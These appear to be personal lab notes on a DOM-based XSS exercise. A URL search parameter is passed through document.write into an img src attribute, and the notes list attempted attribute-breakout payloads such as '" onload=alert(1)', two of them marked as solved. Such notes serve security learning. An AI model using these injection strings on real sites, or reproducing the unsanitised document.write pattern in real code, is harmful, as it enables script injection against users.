/*
enter string HAHAHA
check the inspector for output HAHAHA

theres a script tag in which a function is defined
------------------------------------------------
------------------------------------------------
function trackSearch(query) { 
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">'); 
} var query = (new URLSearchParams(window.location.search)).get('search'); 
if(query) { 
    trackSearch(query); 
}
<img src="/resources/images/tracker.gif?searchTerms=HAHAHA">


Our input is getting displayed as a part of the value of src attribute of the img tag

"+onload=alert(1)
" onload=alert(1)"
" onload=alert(1)
" onload="alert(1)"          //solved
" onload="alert(1)           //clean-solved 
*/